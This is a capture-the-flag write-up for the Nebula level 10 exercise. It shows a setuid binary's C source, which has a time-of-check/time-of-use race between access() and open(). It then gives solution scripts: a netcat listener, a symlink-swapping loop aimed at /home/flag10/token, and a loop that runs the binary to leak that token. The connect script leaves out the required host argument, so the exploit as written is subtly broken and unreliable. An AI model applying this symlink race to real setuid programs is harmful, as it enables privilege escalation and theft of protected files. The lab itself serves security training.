# Level10

#### About

The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.  
To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10. 


#### Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
	char *file;
	char *host;

	if(argc < 3) {
		printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
		exit(1);
	}

	file = argv[1];
	host = argv[2];

	if(access(argv[1], R_OK) == 0) {
		int fd;
		int ffd;
		int rc;
		struct sockaddr_in sin;
		char buffer[4096];

		printf("Connecting to %s:18211 .. ", host); fflush(stdout);

		fd = socket(AF_INET, SOCK_STREAM, 0);

		memset(&sin, 0, sizeof(struct sockaddr_in));
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(host);
		sin.sin_port = htons(18211);

		if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
			printf("Unable to connect to host %s\n", host);
			exit(EXIT_FAILURE);
		}

#define HITHERE ".oO Oo.\n"
		if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
			printf("Unable to write banner to host %s\n", host);
			exit(EXIT_FAILURE);
		}
#undef HITHERE

		printf("Connected!\nSending file .. "); fflush(stdout);

		ffd = open(file, O_RDONLY);
		if(ffd == -1) {
			printf("Damn. Unable to open file\n");
			exit(EXIT_FAILURE);
		}

		rc = read(ffd, buffer, sizeof(buffer));
		if(rc == -1) {
			printf("Unable to read from file: %s\n", strerror(errno));
			exit(EXIT_FAILURE);
		}

		write(fd, buffer, rc);

		printf("wrote file!\n");

	} else {
		printf("You don't have access to %s\n", file);
	}
}
```


#### solutions

```
echo aaaaaaaa>/tmp/token
nc -kl 18211
```

* ---- /tmp/create_link.sh ----
```
#!/bin/bash
while true
do
    ln -fs /tmp/token /tmp/lv10_token
    ln -fs /home/flag10/token /tmp/lv10_token 
done
```

* ----/tmp/connect.sh ----
```
#!/bin/bash
while true
do
    /home/flag10/flag10 /tmp/lv10_token
done

su flag10
/bin/getflag
```


#### Recommend

http://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level10/
